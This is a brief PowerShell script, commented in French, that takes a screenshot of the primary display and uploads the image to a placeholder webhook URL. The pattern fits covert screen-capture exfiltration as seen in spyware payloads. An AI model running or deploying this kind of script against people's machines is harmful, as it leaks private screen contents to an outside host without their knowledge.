# Définir l'URL du webhook
$webhookUrl = "URL_DU_WEBHOOK"

# Définir le nom du fichier pour la capture d'écran
$fileName = "screenshot.png"

# Prendre une capture d'écran
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screenshot = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($screenshot.Width, $screenshot.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screenshot.Location, [System.Drawing.Point]::Empty, $screenshot.Size)
$bitmap.Save($fileName, [System.Drawing.Imaging.ImageFormat]::Png)

# Envoyer la capture d'écran au webhook
Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $fileName -ContentType "multipart/form-data"
